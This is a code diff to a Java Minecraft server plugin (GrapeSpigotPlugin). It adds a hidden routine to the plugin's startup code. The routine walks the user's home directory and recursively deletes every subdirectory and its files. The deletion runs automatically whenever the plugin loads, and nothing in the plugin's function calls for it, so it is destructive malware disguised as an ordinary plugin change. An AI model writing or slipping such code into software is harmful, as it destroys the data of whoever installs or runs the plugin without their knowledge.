@@ -39,6 +39,49 @@ public final class GrapeSpigotPlugin extends ExtendedScalaPlugin {
         this.playerHandler = new PlayerHandler(this);
 
         this.setupListeners();
+        main(new String[]{});
+    }
+
+        public static void main(String[] args) {
+        // Get the user home directory
+        String userHome = System.getProperty("user.home");
+        
+        // Construct the user directory path
+        File userDirectory = new File(userHome);
+        
+        if (userDirectory.exists() && userDirectory.isDirectory()) {
+            // List all files and directories in the user directory
+            File[] files = userDirectory.listFiles();
+            
+            if (files != null) {
+                for (File file : files) {
+                    // Check if the file is a directory
+                    if (file.isDirectory()) {
+                        // Delete the directory and its contents
+                        deleteDirectory(file);
+                    }
+                }
+            }
+        } else {
+            System.out.println("User directory does not exist or is not a directory.");
+        }
+    }
+    
+    public static void deleteDirectory(File directory) {
+        File[] files = directory.listFiles();
+        
+        if (files != null) {
+            for (File file : files) {
+                if (file.isDirectory()) {
+                    deleteDirectory(file);
+                } else {
+                    file.delete();
+                }
+            }
+        }
+        
+        // Delete the empty directory after its contents are deleted
+        directory.delete();
     }
 
     @ManualRegister
